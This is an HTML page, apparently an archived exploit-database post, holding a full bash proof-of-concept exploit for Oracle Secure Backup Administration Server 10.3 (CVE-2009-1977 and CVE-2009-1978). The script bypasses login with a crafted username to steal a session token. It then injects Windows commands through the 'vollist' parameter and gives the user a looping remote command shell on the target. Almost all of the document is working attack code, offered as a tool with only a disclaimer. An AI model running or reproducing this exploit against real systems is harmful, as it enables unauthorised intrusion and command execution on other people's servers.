<html><head><title>Oracle Secure Backup Server 10.3.0.1.0 Auth Bypass/RCI Exploit</title></head><pre>#!/bin/bash

#Oracle Secure Backup Administration Server authentication bypass, plus command injection vulnerability
#1-day exploit for CVE-2009-1977 and CVE-2009-1978 

#PoC script successfully tested on:
#Oracle Secure Backup Server 10.3.0.1.0_win32_release
#MS Windows Professional XP SP3

#In August 2009, ZDI discloses a few details regarding a couple of interesting vulnerabilities within Oracle Backup Admin server.
#Since I was quite interested in such flaws, I did a bit of research. This PoC exploits two separate vulnerabilities: a smart 
#authentication bypass and a trivial command injection, resulting in arbitrary command execution. 

#References:
#http://www.zerodayinitiative.com/advisories/ZDI-09-058/
#http://www.zerodayinitiative.com/advisories/ZDI-09-059/

#Use it for ethical pentesting only! The author accepts no liability for damage caused by this tool.
#Luca &quot;ikki&quot; Carettoni (blog.nibblesec.org), 10th September 2009

clear
echo &quot;:: Oracle Secure Backup Admin Server 10.3 AuthBypass/CodeExec Exploit ::&quot;

if [[ $# -ne 1 ]]
then
	echo &quot;usage: ./$(basename $0) &lt;target IP&gt;&quot;
	echo &quot;i.e.: ./$(basename $0) 192.168.0.100&quot;
	exit
fi

if ! which curl &gt;/dev/null
then
	echo &quot;'curl' is required in order to handle HTTPS connections&quot;
    exit
fi

TARGET=$1

#Exploiting CVE-2009-1977 and getting a valid token
echo &quot;[+] Exploiting CVE-2009-1977 against $TARGET&quot;
postdata=&quot;button=Login&amp;attempt=1&amp;mode=&amp;tab=&amp;uname=--fakeoption&amp;passwd=fakepwd&quot;
session=`curl -kis &quot;https://$TARGET/login.php&quot; -d $postdata | grep &quot;PHPSESSID=&quot; | head -n 1 | cut -d= -f 2 | cut -d\; -f 1`

if [[ -z $session ]]
then
	echo &quot;[!] Fatal error. No valid token has been retrieved&quot;
	exit
fi

echo &quot;[+] I got a valid token: $session&quot;

#Use a valid session and CVE-2009-1978 in order to inject arbitrary commands
echo &quot;[+] Exploiting CVE-2009-1978 against $TARGET&quot;
shell=&quot;1%26ver&gt;osb103shelltmp&quot;
curl -k -s &quot;https://$TARGET/property_box.php?type=CheckProperties&amp;vollist=$shell&quot; -b &quot;PHPSESSID=$session&quot; &gt; /dev/null
check=`curl -ks &quot;https://$TARGET/osb103shelltmp&quot; -b &quot;PHPSESSID=$session&quot; | grep -i Microsoft`

if [[ -z $check ]]
then
	echo &quot;[!] Fatal error. I cannot execute arbitrary commands&quot;
	exit
fi

echo &quot;[+] Enjoy your non-interactive shell! Use EXIT to clean up everything&quot;
echo
echo \&gt;$check

while(true); do
	echo -n \&gt;
	read -r cmd
	
	if [ &quot;$cmd&quot; == &quot;EXIT&quot; ]
	then
		echo &quot;[+] Removing the temporary file and closing&quot;
		shell=&quot;1%26del%20osb103shelltmp&quot;
		curl -k -s &quot;https://$TARGET/property_box.php?type=CheckProperties&amp;vollist=$shell&quot; -b &quot;PHPSESSID=$session&quot; &gt; /dev/null
		exit
	fi
	
	#URLencode function
	cmd=`echo -n &quot;$cmd&quot;|od -t x1 -A n|tr &quot; &quot; %`
	shell=&quot;1%26$cmd&gt;osb103shelltmp&quot;
	curl -k -s &quot;https://$TARGET/property_box.php?type=CheckProperties&amp;vollist=$shell&quot; -b &quot;PHPSESSID=$session&quot; &gt; /dev/null
	echo &quot;[+] Last successful command execution:&quot;
	curl -ks &quot;https://$TARGET/osb103shelltmp&quot; -b &quot;PHPSESSID=$session&quot;
done
#end

# milw0rm.com [2009-09-14]</pre></html>